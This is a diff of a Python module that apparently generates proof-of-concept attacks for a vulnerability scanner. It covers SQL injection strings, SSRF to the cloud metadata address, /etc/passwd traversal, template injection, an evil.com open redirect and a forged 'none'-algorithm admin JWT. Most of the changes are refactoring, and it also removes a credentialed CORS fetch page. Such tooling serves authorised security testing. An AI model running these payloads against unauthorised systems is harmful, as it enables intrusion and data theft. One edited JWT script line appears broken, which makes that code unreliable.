@@ -1,8 +1,7 @@
 from __future__ import annotations
 
-import json
 from dataclasses import dataclass, field
-from typing import Any, Optional
+from typing import Any
 
 
 @dataclass
@@ -19,7 +18,7 @@ class PoC:
 
 class PoCGenerator:
     @staticmethod
-    def generate_poc(finding: Any, target: str = "") -> Optional[PoC]:
+    def generate_poc(finding: Any, target: str = "") -> PoC | None:
         category = ""
         if hasattr(finding, "category") and finding.category:
             category = finding.category
@@ -66,7 +65,7 @@ print(resp.text)""",
         return PoC(
             vulnerability="SQL Injection",
             title=title or "SQL Injection Vulnerability",
-            curl_command=f'curl -s "{target}?id=1\' OR \'1\'=\'1"',
+            curl_command=f"curl -s \"{target}?id=1' OR '1'='1\"",
             python_script=f"""import requests
 url = "{target}"
 payload = {{"id": "1' OR '1'='1"}}
@@ -77,7 +76,10 @@ if "sql" in resp.text.lower() or "mysql" in resp.text.lower():
             burp_request=f"GET /?id=1' OR '1'='1 HTTP/1.1\nHost: {target}",
             description="SQL Injection allows attackers to interfere with database queries.",
             expected_result="Database error messages or unexpected data returned",
-            references=["https://owasp.org/www-community/attacks/SQL_Injection/", "https://cwe.mitre.org/data/definitions/89.html"],
+            references=[
+                "https://owasp.org/www-community/attacks/SQL_Injection/",
+                "https://cwe.mitre.org/data/definitions/89.html",
+            ],
         )
 
     @staticmethod
@@ -95,7 +97,10 @@ if "ami-id" in resp.text or "meta-data" in resp.text:
             burp_request=f"GET /?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1\nHost: {target}",
             description="SSRF allows attackers to make requests from the server to internal services.",
             expected_result="Access to cloud metadata or internal services",
-            references=["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery/", "https://cwe.mitre.org/data/definitions/918.html"],
+            references=[
+                "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery/",
+                "https://cwe.mitre.org/data/definitions/918.html",
+            ],
         )
 
     @staticmethod
@@ -113,7 +118,10 @@ if "root:" in resp.text:
             burp_request=f"GET /?file=../../../etc/passwd HTTP/1.1\nHost: {target}",
             description="LFI allows attackers to read arbitrary files on the server.",
             expected_result="File contents displayed in response",
-            references=["https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion/", "https://cwe.mitre.org/data/definitions/98.html"],
+            references=[
+                "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion/",
+                "https://cwe.mitre.org/data/definitions/98.html",
+            ],
         )
 
     @staticmethod
@@ -132,7 +140,10 @@ if "49" in resp.text:
             burp_request=f"GET /?name={{7*7}} HTTP/1.1\nHost: {target}",
             description="SSTI allows attackers to inject malicious template code.",
             expected_result="Expression evaluated in response (e.g., 49 for {{7*7}})",
-            references=["https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Server-Side_Template_Injection/", "https://cwe.mitre.org/data/definitions/1336.html"],
+            references=[
+                "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Server-Side_Template_Injection/",
+                "https://cwe.mitre.org/data/definitions/1336.html",
+            ],
         )
 
     @staticmethod
@@ -150,7 +161,10 @@ if resp.status_code in (301, 302) and "evil.com" in resp.headers.get("Location",
             burp_request=f"GET /?redirect=https://evil.com HTTP/1.1\nHost: {target}",
             description="Open redirect allows attackers to redirect users to malicious sites.",
             expected_result="Redirect to external URL",
-            references=["https://owasp.org/www-community/vulnerabilities/Open_redirect/", "https://cwe.mitre.org/data/definitions/601.html"],
+            references=[
+                "https://owasp.org/www-community/vulnerabilities/Open_redirect/",
+                "https://cwe.mitre.org/data/definitions/601.html",
+            ],
         )
 
     @staticmethod
@@ -158,35 +172,29 @@ if resp.status_code in (301, 302) and "evil.com" in resp.headers.get("Location",
         return PoC(
             vulnerability="JWT Weakness",
             title=title or "JWT Vulnerability",
-            curl_command='''curl -s -H "Authorization: Bearer $(python3 -c "import jwt; print(jwt.encode({'sub':'admin'}, '', algorithm='none'))")"''' + f" {target}",
+            curl_command='''curl -s -H "Authorization: Bearer $(python3 -c "import jwt; print(jwt.encode({'sub':'admin'}, '', algorithm='none'))")"'''
+            + f" {target}",
             python_script="""import jwt
 import requests
 # JWT none algorithm attack
 token = jwt.encode({"sub": "admin"}, "", algorithm="none")
 headers = {"Authorization": f"Bearer {token}"}
-resp = requests.get("""" + target + """", headers=headers)
+resp = requests.get("""
+            " + target + "
+            """, headers=headers)
 if resp.status_code == 200:
     print("JWT none algorithm attack successful")""",
             burp_request=f"GET / HTTP/1.1\nHost: {target}\nAuthorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
             description="JWT with 'none' algorithm or weak secret can be forged.",
             expected_result="Access to protected resources without valid credentials",
-            references=["https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_for_JSON_Web_Tokens/", "https://cwe.mitre.org/data/definitions/345.html"],
+            references=[
+                "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_for_JSON_Web_Tokens/",
+                "https://cwe.mitre.org/data/definitions/345.html",
+            ],
         )
 
     @staticmethod
     def _cors_poc(target: str, title: str) -> PoC:
-        poc_html = f"""<!DOCTYPE html>
-<html>
-<body>
-<script>
-fetch('{target}', {{
-    credentials: 'include'
-}}).then(r => r.text()).then(d => {{
-    document.body.innerHTML = '<pre>' + d + '</pre>';
-}});
-</script>
-</body>
-</html>"""
         return PoC(
             vulnerability="CORS Misconfiguration",
             title=title or "CORS Misconfiguration",
@@ -201,7 +209,10 @@ if cors == "*" or "evil.com" in cors:
             burp_request=f"GET / HTTP/1.1\nHost: {target}\nOrigin: https://evil.com\nUser-Agent: Mozilla/5.0",
             description="CORS misconfiguration allows cross-origin requests from unauthorized domains.",
             expected_result="Access-Control-Allow-Origin reflects attacker's origin",
-            references=["https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny/", "https://cwe.mitre.org/data/definitions/942.html"],
+            references=[
+                "https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny/",
+                "https://cwe.mitre.org/data/definitions/942.html",
+            ],
         )
 
     @staticmethod
@@ -221,5 +232,5 @@ print(resp.status_code)""",
         )
 
 
-def generate_poc_for_finding(finding: Any, target: str = "") -> Optional[PoC]:
+def generate_poc_for_finding(finding: Any, target: str = "") -> PoC | None:
     return PoCGenerator.generate_poc(finding, target)
